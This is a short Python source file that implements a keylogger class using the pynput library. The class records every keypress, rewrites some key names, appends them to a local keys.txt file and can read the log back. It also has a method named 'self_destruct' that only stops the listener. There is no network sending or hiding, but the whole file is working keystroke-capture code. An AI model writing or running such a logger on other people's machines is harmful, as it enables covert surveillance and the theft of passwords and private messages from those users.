from pynput.keyboard import Listener

class KeyLogger:

    #log a keypress
    def on_press(key):
        k = str(key)
        k = k.replace("'", " ")
        k = k.replace("Key.backspace", "Backspace")
        k = k.replace("Key.enter", "\n")
        k = k.replace("Key.shift", "Shift")
        k = k.replace("Key.space", " ")
        k = k.replace("Key.caps_lock", "Caps Lock")
        
        file = open("keys.txt", "a")
        file.write(k)
        file.write('\n')
        file.close()

    #start logging keys
    def start(self):
        with Listener(on_press=KeyLogger.on_press) as self.listener:
            self.listener.join()
    
    #returns keystrokes as a string
    def readkeys(self):
        with open('keys.txt', 'r') as file:
            return file.read().rstrip()

    #stop recording keystrokes
    def self_destruct(self):
        self.listener.stop()